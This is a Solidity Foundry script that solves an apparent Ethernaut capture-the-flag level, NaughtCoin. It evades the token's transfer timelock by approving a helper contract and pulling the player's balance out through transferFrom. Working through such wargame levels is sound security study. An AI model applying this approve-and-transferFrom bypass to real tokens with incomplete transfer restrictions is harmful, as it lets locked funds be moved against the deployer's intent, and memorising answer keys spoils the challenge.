// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{NaughtCoin} from "../src/Level15.sol";

/** this is the helper contract that acts spender for player address */
contract Helper{
    NaughtCoin instance=NaughtCoin(0x03DF5BC61A161ADFED2BB7D12d8b8a12779849E9);
    function transferFromOwner(address owner, uint256 amount) external {
        require(instance.allowance(owner, address(this)) >= amount, "Insufficient allowance");
        instance.transferFrom(owner, address(this), amount);
    }

    function getBalance() external view returns (uint256) {
        return instance.balanceOf(address(this));
    }
    receive() external payable{}
}
/** To transfer the tokens without the lockout time being compelted use approve mechanism */
contract Level15Solution is Script{
    NaughtCoin instance=NaughtCoin(0x03DF5BC61A161ADFED2BB7D12d8b8a12779849E9);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("owner",instance.player());
        uint256 balance=instance.balanceOf(instance.player());
        console.log("balance",balance);
        Helper helper=new Helper();
        instance.approve(address(helper), balance);
        console.log("Allowance after approve", instance.allowance(instance.player(), address(helper)));
        helper.transferFromOwner(instance.player(), balance);
        console.log("updated player balance",instance.balanceOf(instance.player()));
        console.log("Helper balance after transfer:", helper.getBalance());
        vm.stopBroadcast();
    }
}